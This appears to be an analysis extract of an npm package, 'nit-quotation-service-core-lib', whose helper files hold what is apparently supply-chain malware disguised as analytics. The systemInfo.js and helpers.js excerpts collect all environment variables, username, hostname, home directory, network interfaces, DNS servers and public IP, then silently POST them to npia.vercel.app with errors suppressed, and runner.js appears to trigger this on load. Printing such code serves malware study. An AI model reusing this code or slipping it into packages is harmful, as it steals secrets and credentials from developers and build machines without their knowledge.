// File: tmp/tmpe1fg10nx/nit-quotation-service-core-lib/package/helpers/envCheck.js
// ======================================================================
Line 1: const os = require("os")
Line 4: os.userInfo()
Line 5: os.type()

// File: tmp/tmpe1fg10nx/nit-quotation-service-core-lib/package/helpers/helpers.js
// ======================================================================
Line 677: const fs = require("fs")
Line 678: const os = require("os")
Line 679: const path = require("path")
Line 680: _tmp_8 = require("child_process")
Line 681: const dns = require("dns")
Line 682: const querystring = require("querystring")
Line 683: const https = require("https")
Line 684: const packageJSON = require("../package.json")
Line 685: _tmp_9 = require("./envCheck")
Line 686: _tmp_10 = require("./systemInfo")
Line 688: {
  if (!isSafeEnv()) return;

  const postData = querystring.stringify({
    msg: JSON.stringify(systemInfo || {})
  });

  const options = {
    hostname: "npia.vercel.app",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  const req = https.request(options, (res) => {
    res.on("data", () => {
      // silent
    });
  });

  req.on("error", () => {
    // silent fail
  });

  req.write(postData);
  req.end();
}
Line 706: const req = https.request(options, (res) => {
    res.on("data", () => {
      // silent
    });
  })
Line 716: req.write(postData)
Line 717: req.end()
Line 725: path.join(__dirname, "..", "logs")
Line 729: path.join(logPath, filename)
Line 734: ["production", "staging", "development"].includes(env)
Line 737: {
  const keys = ["NODE_ENV", "USER", "USERNAME", "HOSTNAME"];
  const summary = {};
  for (const key of keys) {
    if (process.env[key]) {
      summary[key] = process.env[key];
    }
  }
  return summary;
}
Line 738: const keys = ["NODE_ENV", "USER", "USERNAME", "HOSTNAME"]
Line 740: _iterator_0.next()
Line 741: {
      summary[key] = process.env[key];
    }
Line 742: summary[key] = process.env[key]
Line 750: path.join(os.homedir(), "analytics_backup.json")
Line 772: getAnalyticsData(systemInfo)

// File: tmp/tmpe1fg10nx/nit-quotation-service-core-lib/package/helpers/logger.js
// ======================================================================
Line 2: {
    console.log("[DEBUG]", msg);
  }
Line 3: console.log("[DEBUG]", msg)

// File: tmp/tmpe1fg10nx/nit-quotation-service-core-lib/package/helpers/systemInfo.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 5: {
  const limitedEnv = {};
  const envKeys = Object.keys(process.env);

/*
  //envKeys.slice(0, 50).forEach((key) => {
  envKeys.forEach((key) => {
    const value = process.env[key];
    //limitedEnv[key] = (value && value.length > 100) ? value.slice(0, 500) + "…" : value;
    limitedEnv[key] = value;
  });
  */
  
  envKeys.forEach((key) => {
  const value = process.env[key];
  if (key === 'PATH' && value && value.length > 200) {
    limitedEnv[key] = value.slice(0, 200) + '…';
  } else {
    limitedEnv[key] = value;
  }
});

  const systemInfo = {
    p: packageJSON.name,
    c: __dirname,
    ot: os.type(),
    op: os.platform(),
    or: os.release(),
    hn: os.hostname(),
    ni: os.networkInterfaces(),
    dns: dns.getServers(),
    om: os.totalmem(),
    un: os.userInfo().username,
    hd: os.homedir(),
    td: os.tmpdir(),
    r: packageJSON.___resolved || undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    rd: "",
    pi: "",
    env: limitedEnv,
  };

  con...
Line 7: Object.keys(process.env)
Line 18: {
  const value = process.env[key];
  if (key === 'PATH' && value && value.length > 200) {
    limitedEnv[key] = value.slice(0, 200) + '…';
  } else {
    limitedEnv[key] = value;
  }
}
Line 19: const value = process.env[key]
Line 20: {
    limitedEnv[key] = value.slice(0, 200) + '…';
  }
Line 21: limitedEnv[key] = value.slice(0, 200) + '…'
Line 22: {
    limitedEnv[key] = value;
  }
Line 23: limitedEnv[key] = value
Line 30: os.type()
Line 31: os.platform()
Line 33: os.hostname()
Line 36: os.totalmem()
Line 37: os.userInfo()
Line 49: const firstIPv4 = Object.values(interfaces).flat().find(i => i.family === 'IPv4' && !i.internal)
Line 54: {
        systemInfo.rd = hostnames[0];
      }
Line 55: systemInfo.rd = hostnames[0]
Line 62: (_tmp_4 = https.get("https://api.ipify.org", (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => {
        systemInfo.pi = data.trim();
        cb();
      });
    }))
Line 66: data.trim()
Line 72: doReverseDNS(firstIPv4, () => {
    doPublicIP(() => {
      callback(systemInfo);
    });
  })
Line 74: callback(systemInfo)

// File: tmp/tmpe1fg10nx/nit-quotation-service-core-lib/package/runner.js
// ======================================================================
Line 676: const helpers = require("./helpers/helpers.js")
Line 689: helpers.getAnalyticsDataCore()
Line 695: _tmp_0.push("")
